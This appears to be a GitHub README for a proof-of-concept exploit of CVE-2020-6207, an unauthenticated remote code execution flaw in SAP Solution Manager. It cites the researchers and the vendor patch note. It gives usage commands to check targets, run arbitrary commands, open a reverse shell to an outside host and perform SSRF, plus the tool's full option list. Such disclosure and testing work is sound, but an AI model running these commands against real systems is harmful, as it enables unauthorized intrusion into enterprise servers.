PoC for **CVE-2020-6207**  (Missing Authentication Check in SAP Solution Manager)  
This script allows to check and exploit missing authentication checks in SAP EEM servlet (`tc~smd~agent~application~eem`) that lead to RCE on SAP SMDAgents connected to SAP Solution Manager  
Original finding: 
- [Pablo Artuso](https://twitter.com/lmkalg)
- [Yvan 'iggy' G](https://twitter.com/_1ggy) 

Paper: [An Unauthenticated Journey to Root :Pwning Your Company's Enterprise Software Servers](https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf)   
Solution: sap note [2890213](https://launchpad.support.sap.com/#/notes/2890213) 

Follow me in Twitter: [@_chipik_](https://twitter.com/_chipik) 

***This project is created only for educational purposes and cannot be used for law violation or personal gain.
<br>The author of this project is not responsible for any possible harm caused by the materials of this project***


# Details

You will find vulnerabilities details in [process](./Process.md) article

# How to use

Just point SAP Solution Manager hostnmae/ip.

## Check

```
➜ python sol-rce.py -H 172.16.30.43 -P 50000 -c
Vulnerable! [CVE-2020-6207] - http://172.16.30.43:50000
```

## Trigger RCE

```
➜ python sol-rce.py -H 172.16.30.43 -P 50000 --rce calc.exe
```

![gif](img/rce.gif) 

## Get BackConnect

```
➜ python sol-rce.py -H 172.16.30.43 -P 50000 --back 1.1.1.1:1337
```

## SSRF 

```
➜ python sol-rce.py -H 172.16.30.43 -P 50000 --ssrf http://1.1.1.1/chpk
```

## Other

There is additional options:
```
➜ python sol-rce.py -h

usage: sol-rce.py [-h] [-H HOST] [-P PORT] [-p PROXY] [-s] [-c] [-d VICTIM]
                  [--ssrf SSRF] [--rce RCE] [--back BACK] [--setup SETUP]
                  [--list] [--clear] [-t TIMEOUT] [-v]

PoC for CVE-2020-6207, (Missing Authentication Check in SAP Solution Manager)
This script allows to check and exploit missing authentication checks in SAP EEM servlet (tc~smd~agent~application~eem) that lead to RCE on SAP SMDAgents connected to SAP Solution Manager
Original finding:
- Pablo Artuso. https://twitter.com/lmkalg
- Yvan 'iggy' G https://twitter.com/_1ggy

Paper: https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf
Solution: https://launchpad.support.sap.com/#/notes/2890213

twitter: https://twitter.com/_chipik

optional arguments:
  -h, --help            show this help message and exit
  -H HOST, --host HOST  SAP Solution Manager host(default: 127.0.0.1)
  -P PORT, --port PORT  SAP Solution Manager web port (default: tcp/50000)
  -p PROXY, --proxy PROXY
                        Use proxy (ex: 127.0.0.1:8080)
  -s, --ssl             enable SSL
  -c, --check           just detect vulnerability
  -d VICTIM, --victim VICTIM
                        DA serverName
  --ssrf SSRF           exploit SSRF. Point http address here. (example:http://1.1.1.1/chpk)
  --rce RCE             exploit RCE
  --back BACK           get backConnect from DA. (ex: 1.1.1.1:1337)
  --setup SETUP         setup a random serverName to the DA with the given hostName and instanceName. (example: javaup.mshome.net,SMDA97)
  --list                Get a list of existing DA servers
  --clear               stop and delete all PoCScript<rnd> scripts from DA servers
  -t TIMEOUT, --timeout TIMEOUT
                        HTTP connection timeout in second (default: 10)
  -v, --verbose         verbose mode
```